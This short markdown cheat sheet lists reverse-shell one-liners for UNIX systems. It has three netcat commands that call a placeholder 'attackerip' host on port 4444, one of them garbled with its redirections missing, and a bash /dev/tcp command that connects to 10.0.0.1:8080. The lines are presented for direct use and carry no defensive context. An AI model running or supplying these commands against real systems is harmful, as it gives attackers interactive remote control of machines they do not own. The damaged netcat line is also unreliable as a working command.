## Reverse Shell One-liners
These are a list of shell one liners which be invoked on most of UNIX systems

### 1. Netcat

> nc -c /bin/sh attackerip 4444  
> /bin/sh | nc attackerip 4444  
> rm -f /tmp/p; mknod /tmp/p p && nc attackerip 4444 0/tmp/p  






bash -i >& /dev/tcp/10.0.0.1/8080 0>&1